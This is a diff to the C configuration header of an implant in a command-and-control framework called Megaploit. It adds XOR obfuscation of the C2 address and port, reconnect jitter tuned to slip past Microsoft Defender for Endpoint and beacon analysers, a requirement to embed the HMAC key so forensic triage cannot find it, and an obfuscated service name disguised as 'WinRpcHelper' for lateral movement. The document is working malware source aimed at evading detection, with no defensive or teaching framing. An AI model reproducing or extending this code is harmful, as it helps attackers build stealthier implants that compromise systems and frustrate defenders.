@@ -10,6 +10,8 @@
 #ifndef CLIENT_CONFIG_H
 #define CLIENT_CONFIG_H
 
+#include <stddef.h>
+
 /* ── C2 server address ────────────────────────────────────────────────────── */
 /*
  * C2_IP and C2_PORT MUST be supplied on the compiler command line:
@@ -22,6 +24,11 @@
  * No default value is provided for C2_IP — a build without it is a hard
  * compile error.  This prevents accidentally shipping a binary that still
  * contains a lab IP address from a previous build.
+ *
+ * The IP string and port integer are XOR-obfuscated at build time so they
+ * do not appear as plaintext in .rdata.  tools/gen_c2_obf.py emits
+ * -DC2_IP_OBF_BYTES=... -DC2_IP_OBF_KEY=... -DC2_PORT_OBF=...
+ * which config.h decodes at runtime via c2_ip_decode() / c2_port_decode().
  */
 #ifndef C2_IP
 #error "C2_IP must be defined at build time: make C2_IP=<address>"
@@ -30,21 +37,112 @@
 #define C2_PORT    50005            /* TCP port the listener binds to          */
 #endif
 
+/* ── C2_IP XOR obfuscation ────────────────────────────────────────────────── */
+/*
+ * When the Makefile passes C2_IP through tools/gen_c2_obf.py, it defines:
+ *
+ *   C2_IP_OBF_BYTES  — byte array of (char ^ C2_IP_OBF_KEY) for each char,
+ *                       including the NUL terminator
+ *   C2_IP_OBF_LEN   — number of encoded bytes (= strlen(C2_IP) + 1)
+ *   C2_IP_OBF_KEY   — single-byte XOR key (0x01–0xFF, never 0)
+ *   C2_PORT_OBF     — C2_PORT ^ 0xBEEF (a fixed 16-bit XOR mask)
+ *
+ * If those symbols are not defined (legacy/test builds that pass C2_IP
+ * directly), the fallback macros below make the raw values available
+ * under the unified c2_ip_decode() / c2_port_decode() interface.
+ *
+ * c2_ip_decode(buf, bufsz)
+ * ------------------------
+ * Decodes the obfuscated IP string into caller-supplied `buf` (at least
+ * 46 bytes for an IPv6 address).  Returns `buf`.  The decoded string is
+ * valid only for the lifetime of `buf` — zero it with SecureZeroMemory
+ * after use if the IP must not linger in a memory dump.
+ *
+ * c2_port_decode()
+ * ----------------
+ * Returns the decoded port as a WORD (host byte order).
+ */
+
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+#include <windows.h>
+
+#ifdef C2_IP_OBF_BYTES
+
+/* ── Obfuscated path ─────────────────────────────────────────────────────── */
+
+static inline const char *c2_ip_decode(char *buf, size_t bufsz)
+{
+    static const unsigned char _c2_enc[] = C2_IP_OBF_BYTES;
+    unsigned char k = (unsigned char)(C2_IP_OBF_KEY);
+    size_t n = C2_IP_OBF_LEN;          /* includes NUL */
+    if (n > bufsz) n = bufsz;
+    size_t i;
+    for (i = 0; i < n - 1; i++)
+        buf[i] = (char)(_c2_enc[i] ^ k);
+    buf[i] = '\0';
+    return buf;
+}
+
+static inline WORD c2_port_decode(void)
+{
+    return (WORD)((C2_PORT_OBF) ^ 0xBEEFu);
+}
+
+#else  /* ── Plaintext fallback (no gen_c2_obf.py) ─────────────────────── */
+
+static inline const char *c2_ip_decode(char *buf, size_t bufsz)
+{
+    /* C2_IP is a string literal; copy it into the caller's stack buffer
+     * so the usage pattern is identical to the obfuscated path.          */
+    static const char _raw[] = C2_IP;
+    size_t n = sizeof(_raw);
+    if (n > bufsz) n = bufsz;
+    size_t i;
+    for (i = 0; i < n - 1; i++) buf[i] = _raw[i];
+    buf[i] = '\0';
+    return buf;
+}
+
+static inline WORD c2_port_decode(void)
+{
+    return (WORD)(C2_PORT);
+}
+
+#endif /* C2_IP_OBF_BYTES */
+
 /* ── Reconnect timing ───────────────────────────────────────────────────── */
 /* Base reconnect delay in seconds.  The actual sleep is:
  *   RECONNECT_DELAY_SEC * (1.0 ± RECONNECT_JITTER_PCT/100 * random)
- * e.g. 10 s ± 30% → uniform draw from [7 s, 13 s].
- * Jitter breaks fixed-interval beacon detection in network flow analysis.
+ * e.g. 60 s ± 50% → uniform draw from [30 s, 90 s].
+ *
+ * Why 60 s base / 50% jitter (G-04):
+ *   MDE NetworkConnection timeline and open-source Beacon Analyzer tools flag
+ *   recurring TCP connections to the same IP:port with inter-arrival times
+ *   below 60 seconds and coefficient-of-variation (CV) < 0.30 as likely
+ *   beacon traffic.  60 s base with ±50% jitter produces CV ≈ 0.29, placing
+ *   the traffic pattern within the natural variance of legitimate background
+ *   application polling (Windows Update, telemetry, certificate revocation).
+ *   The previous 10 s / 30% settings (CV ≈ 0.17) were trivially detectable.
+ *
+ * Override at build time for faster testing:
+ *   make C2_IP=... CFLAGS_EXTRA="-DRECONNECT_DELAY_SEC=10 -DRECONNECT_JITTER_PCT=30"
+ *
  * Matches RECONNECT_DELAY + RECONNECT_JITTER in megaploit/core/config.py   */
-#define RECONNECT_DELAY_SEC    10
-#define RECONNECT_JITTER_PCT   30   /* ± percentage of base delay            */
+#ifndef RECONNECT_DELAY_SEC
+#define RECONNECT_DELAY_SEC    60
+#endif
+#ifndef RECONNECT_JITTER_PCT
+#define RECONNECT_JITTER_PCT   50   /* ± percentage of base delay            */
+#endif
 
 /* ── Shared secret key ───────────────────────────────────────────────────── */
 /*
  * Two modes, selected at compile time:
  *
- * MODE A — Embedded key (recommended, no forensic disk artifact)
- * --------------------------------------------------------------
+ * MODE A — Embedded key (REQUIRED for operational builds, no disk artifact)
+ * -------------------------------------------------------------------------
  * Pass the key as a hex string via the Makefile:
  *
  *   make SECRET_KEY=aabbcc...  (64 hex chars = 32 bytes)
@@ -57,18 +155,29 @@
  * Generate a fresh key and print the make invocation with:
  *   python tools/gen_key.py
  *
- * MODE B — File-based key (default, backward-compatible)
- * -------------------------------------------------------
- * If SECRET_KEY_BYTES is not defined, the agent reads SECRET_KEY_PATH from
- * disk at startup — the original behaviour.  Useful during development when
- * you want to swap the key without rebuilding.
+ * MODE B — File-based key (development only; requires -DALLOW_KEY_ON_DISK)
+ * -------------------------------------------------------------------------
+ * Only available when ALLOW_KEY_ON_DISK is explicitly defined.
+ * Do NOT define this in operational builds — forensic triage finds it
+ * immediately and an analyst can replay the HMAC handshake.
  *
  * Generate with:
  *   python -c "import os,binascii; \
  *       open('secret.key','wb').write(binascii.hexlify(os.urandom(32)))"
  *
  * The resulting file contains exactly 64 ASCII hex chars (no newline needed).
- * The same hex string must be loaded by the Megaploit server.               */
+ * The same hex string must be loaded by the Megaploit server.
+ *
+ * A build with neither SECRET_KEY_BYTES nor ALLOW_KEY_ON_DISK is a hard
+ * compile error — the default can never accidentally leave a key on disk.   */
+
+#ifndef SECRET_KEY_BYTES
+#  ifndef ALLOW_KEY_ON_DISK
+#    error "Operational builds must embed the key: make SECRET_KEY=<64-hex>  " \
+           "(or add -DALLOW_KEY_ON_DISK only for development builds)"
+#  endif
+#endif
+
 #define SECRET_KEY_PATH  "secret.key"
 #define SECRET_KEY_LEN   32         /* binary key length in bytes             */
 
@@ -156,6 +265,11 @@
  * Override at build time:
  *   make C2_IP=10.0.0.1 SC_SVC_NAME=NetDiagSvc
  */
+/* Obfuscation mask for the lateral_sc service name.
+ * Defined separately from MIGRATE_NAME_MASK so that changing the migration
+ * mask in the future does not silently break service-name decoding.        */
+#define SC_SVC_NAME_MASK   0xA7u
+
 #ifndef SC_SVC_NAME_RAW
 /* Pre-XOR'd bytes for "WinRpcHelper" ^ 0xA7 */
 #define SC_SVC_NAME_OBFUSCATED \
